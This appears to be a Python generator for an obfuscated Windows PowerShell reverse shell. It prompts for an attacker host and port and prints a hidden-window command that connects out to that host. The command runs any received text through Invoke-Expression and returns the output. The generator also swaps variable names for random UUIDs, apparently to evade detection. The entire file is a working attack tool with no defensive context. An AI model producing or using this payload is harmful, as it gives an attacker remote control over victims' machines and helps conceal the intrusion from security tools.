import uuid

def gen():
    return f"${uuid.uuid4().hex}"

def replace_terms(script, ip, port):
    replace = {
        "$TCPClient": gen(),
        "$NetworkStream": gen(),
        "$StreamWriter": gen(),
        "$String": gen(),
        "$BytesRead": gen(),
        "IP": ip,
        "PORT": port,
    }

    for old_term, new_term in replace.items():
        script = script.replace(old_term, new_term)

    return script

def main():
    ip = input("LHOST: ")
    port = input("LPORT: ")

    script_win = ("\nHere is your payload: \n"
                  f"Start-Process $PSHOME\\powershell.exe -WindowStyle Hidden -ArgumentList "
                  f"{{"
                  f"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});"
                  f"$NetworkStream = $TCPClient.GetStream();"
                  f"$StreamWriter = New-Object IO.StreamWriter($NetworkStream);"
                  f"function WriteToStream ($String) "
                  f"{{"
                  f"[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}};"
                  f"$StreamWriter.Write($String);"
                  f"$StreamWriter.Flush()"
                  f"}}"
                  f"WriteToStream '';"
                  f"while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) "
                  f"{{"
                  f"$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
                  f"$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}"
                  f"WriteToStream ($Output)"
                  f"}}"
                  f"$StreamWriter.Close()"
                  f"}}")

    payload = replace_terms(script_win, ip, port)

    print(payload)

if __name__ == "__main__":
    main()
